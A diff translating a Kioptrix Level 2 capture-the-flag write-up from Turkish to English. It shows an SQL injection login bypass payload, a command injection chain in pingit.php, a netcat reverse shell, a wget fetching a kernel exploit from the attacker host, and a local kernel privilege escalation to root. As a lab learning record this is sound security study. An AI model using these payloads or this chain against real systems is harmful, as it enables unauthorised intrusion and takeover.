@@ -1,33 +1,33 @@
 # Kioptrix Level 2
 
-**Zorluk:** Kolay-Orta
-**Hedef İşletim Sistemi:** CentOS 4.5 (kernel 2.6.9)
-**Sonuç:** Root alındı ✅
+**Difficulty:** Easy–Medium
+**Target OS:** CentOS 4.5 (kernel 2.6.9)
+**Result:** Root ✅
 
-Saldırı zinciri:
+Attack chain:
 
 ```
-Nmap → login ekranında SQL injection → command injection (pingit.php)
+Nmap → SQL injection on the login page → command injection (pingit.php)
 → reverse shell (apache) → kernel privesc → root
 ```
 
 ---
 
-## 1. Keşif (Enumeration)
+## 1. Enumeration
 
 1.
 ```bash
-nmap -T4 -p- <hedef ip>
+nmap -T4 -p- <target ip>
 ```
-2
+2.
 ```bash
-nmap -T4 -A -p<acik portlar> <hedef ip>
+nmap -T4 -A -p<open ports> <target ip>
 ```
 
-Açık portlar:
+Open ports ([raw output](nmap.md)):
 
-| Port | Servis | Versiyon |
-| ---- | ------ | -------- |
+| Port | Service | Version |
+| ---- | ------- | ------- |
 | 22 | SSH | OpenSSH 3.9p1 |
 | 80 | HTTP | Apache 2.0.52 (CentOS) |
 | 111 | rpcbind | RPC #100000 |
@@ -35,46 +35,46 @@ Açık portlar:
 | 631 | IPP | CUPS 1.1 |
 | 3306 | MySQL | MySQL (unauthorized) |
 
-Sistem: CentOS 4.5, kernel 2.6.9. Web tarafı (80/443) ilk hedefim oldu.
+System: CentOS 4.5, kernel 2.6.9. The web side (80/443) was my first target.
 
-## 2. Web — SQL Injection
+## 2. Web: SQL injection
 
-Web arayüzünde bir login (giriş) ekranı vardı. Klasik authentication bypass payload'ı denedim:
+The site had a login page. I tried the classic authentication bypass payload:
 
 ```
 ' or '1'='1#
 ```
 
-Bu, giriş sorgusunu her zaman doğru hale getirerek beni oturuma soktu. (Payload kullanıcı adı ve şifre alanına girildiğinde `WHERE user='' or '1'='1'#...` şeklinde sorguyu tamamen bypass ediyor.)
+It made the login query always true and logged me in. (Entered in the username and password fields, the payload turns the query into `WHERE user='' or '1'='1'#...`, which bypasses the check completely.)
 
-Bu arada dizin taraması da yaptım (ffuf):
-
-```
-http://<hedef>/index.php
-http://<hedef>/pingit.php
-http://<hedef>/manual/
-```
-
-## 3. Web — Command Injection (asıl RCE)
-
-Giriş yaptıktan sonra bir **ping** fonksiyonuna (`pingit.php`) ulaştım — kullanıcıdan bir IP alıp `ping` atıyordu. Burp Suite ile isteği yakalayıp incelediğimde girdinin doğrudan shell'e geçtiğini fark ettim.
-
-**Önemli ders:** Başta bunu SQL injection sandım, ama aslında bu bir **OS Command Injection** — girdi PHP tarafında muhtemelen `system()`/`exec()` ile doğrudan shell'e veriliyor. İkisini ayırt etmek kritikti.
-
-Shell operatörü ekleyerek komut zincirledim:
+I also ran a directory scan (ffuf):
 
 ```
-127.0.0.1; <komut>
+http://<target>/index.php
+http://<target>/pingit.php
+http://<target>/manual/
 ```
 
-Ardından Kali'de bir netcat dinleyici açıp reverse shell aldım:
+## 3. Web: command injection (the actual RCE)
+
+After logging in I reached a **ping** feature (`pingit.php`) that took an IP address from the user and pinged it. When I captured and inspected the request in Burp Suite, I saw that the input was passed straight to the shell.
+
+**Key lesson:** At first I thought this was SQL injection, but it is actually **OS command injection**: the PHP side most likely passes the input directly to the shell with `system()`/`exec()`. Telling the two apart was critical.
+
+I chained commands with a shell operator:
+
+```
+127.0.0.1; <command>
+```
+
+Then I opened a netcat listener on Kali and got a reverse shell:
 
 ```bash
-# Kali (saldırgan) tarafı
+# Kali (attacker) side
 nc -lvnp 4444
 ```
 
-Girdi alanına reverse shell payload'ı zincirledim ve `apache` kullanıcısı olarak shell düştü:
+I chained a reverse shell payload into the input field and got a shell as the `apache` user:
 
 ```
 connect to [192.168.56.170] from (UNKNOWN) [192.168.56.172]
@@ -88,27 +88,27 @@ bash-3.00$ id
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-## 4. Yanlış Yaptığım / Zaman Kaybettiğim Yerler
+## 4. Mistakes and time sinks
 
-Bu box'ta initial shell'den sonra birkaç kez yanlış yola saptım:
+I went down the wrong path several times after the initial shell:
 
-- **DoS exploitine yöneldim.** searchsploit'te Apache 2.0.52 için bir DoS exploiti buldum ve onu denemeyi düşündüm. Bu tamamen yanlış yöndü — elimde zaten bir shell varken DoS sadece servisi çökertir, bana yetki kazandırmaz. Doğru adım privilege escalation'dı, DoS değil. **Ders:** Shell aldıktan sonra hedef "erişimi bozmak" değil, "yetkiyi yükseltmek".
+- **I turned to a DoS exploit.** searchsploit listed a DoS exploit for Apache 2.0.52 and I considered trying it. That was the wrong direction: with a shell already in hand, a DoS only crashes the service and gives me no privileges. The right next step was privilege escalation. **Lesson:** after getting a shell, the goal is to raise privileges, not to break access.
 
-- **İlk kernel exploitinde Python versiyon sorunu.** Bir privesc PoC'sini (`9844.py`) çalıştırmaya çalıştım ama hedefteki eski Python `subprocess` modülünü tanımadı:
+- **Python version problem with the first kernel exploit.** I tried to run a privesc PoC (`9844.py`), but the target's old Python did not have the `subprocess` module:
   ```
   ImportError: No module named subprocess
   ```
-  Eski CentOS'un Python'ı çok eskiydi. **Ders:** Aynı CVE için exploit-db'de birden fazla PoC olur; hedefin Python/C versiyonuna uyan alternatifi seçmek gerekiyor. Python yerine C tabanlı PoC'ye geçmek daha sağlıklıydı.
+  The Python on this old CentOS was too old. **Lesson:** exploit-db often has several PoCs for the same kind of bug; pick one that matches the target's Python/C toolchain. Switching to a C-based PoC was the better choice.
 
-- **Dosya transferinde wget sözdizimi hatası.** Exploiti hedefe indirirken yanlış komut kullandım:
+- **wget syntax error during file transfer.** I used the wrong command while downloading the exploit to the target:
   ```
-  wget http://192.168.56.170:8000 9542.c   # YANLIŞ — boşluk var, 9542.c'yi ayrı URL sanıyor
+  wget http://192.168.56.170:8000 9542.c   # WRONG: the space makes wget treat 9542.c as a separate URL
   ```
-  Doğrusu tam URL vermekti: `wget http://192.168.56.170:8000/9542.c`
+  The correct form is the full URL: `wget http://192.168.56.170:8000/9542.c`
 
-## 5. Privilege Escalation
+## 5. Privilege escalation
 
-Doğru metodolojiyle sistem bilgisi topladım:
+I gathered system information methodically:
 
 ```bash
 uname -a          # kernel 2.6.9
@@ -117,31 +117,24 @@ id
 sudo -l
 ```
 
-Kernel 2.6.9 + CentOS 4.5 için privesc exploiti aradım:
+Then I searched for local privilege escalation exploits for kernel 2.6.9 on CentOS 4.5:
 
 ```bash
 searchsploit linux kernel 2.6.9 local
 ```
 
-Uygun olan:
+The results included several kernel exploits that fit CentOS 4, among them `sock_sendpage()` (exploit-db 9479, CVE-2009-2692) and `ip_append_data()` (exploit-db 9542, CVE-2009-2698). I used **9542.c**, the `ip_append_data()` Ring0 privilege escalation (**CVE-2009-2698**), whose title lists CentOS 4.4/4.5 as targets. I transferred it to the target, compiled it with `gcc` and ran it, and got root.
 
-```
-Linux Kernel 2.4/2.6 (RedHat / Fedora / CentOS 4) -
-'sock_sendpage()' Ring0 Privilege Escalation | linux/local/9479.c
-```
+## 6. Concepts learned
 
-Bu **sock_sendpage() (CVE-2009-2698)** exploiti. Hedefte derleyip çalıştırdım, root alındı.
+- Telling SQL injection (auth bypass) apart from OS command injection
+- Chaining shell operators in command injection (`;`, `&&`, `|`)
+- Capturing and modifying requests with Burp Suite
+- How a netcat reverse shell works
+- Matching a privesc exploit to the kernel version
+- The right method after initial access: enumeration → privesc, not DoS
 
-## 6. Öğrenilen Kavramlar
+## 7. Next time / notes
 
-- SQL injection (auth bypass) ile OS command injection'ı ayırt etmek
-- Command injection'da shell operatör zincirleme (`;`, `&&`, `|`)
-- Burp Suite ile isteği yakalayıp değiştirme
-- netcat reverse shell mantığı
-- Kernel versiyonuna göre privesc exploiti eşleştirme
-- Initial access sonrası doğru metodoloji: DoS değil, enumeration → privesc
-
-## 7. Bir Dahaki Sefere / Notlar
-
-- İlk shell'den sonra LinPEAS gibi bir enumeration scripti çalıştırmak, doğru privesc yolunu manuel aramaktan çok daha hızlı olurdu.
-- Exploit seçerken hedefin araç versiyonlarını (Python, gcc) baştan kontrol etmek, uyumsuz PoC'lerle vakit kaybetmeyi engeller.
+- Running an enumeration script such as LinPEAS after the first shell would have been much faster than searching for the privesc path by hand.
+- Checking the target's tool versions (Python, gcc) before choosing an exploit avoids wasting time on incompatible PoCs.
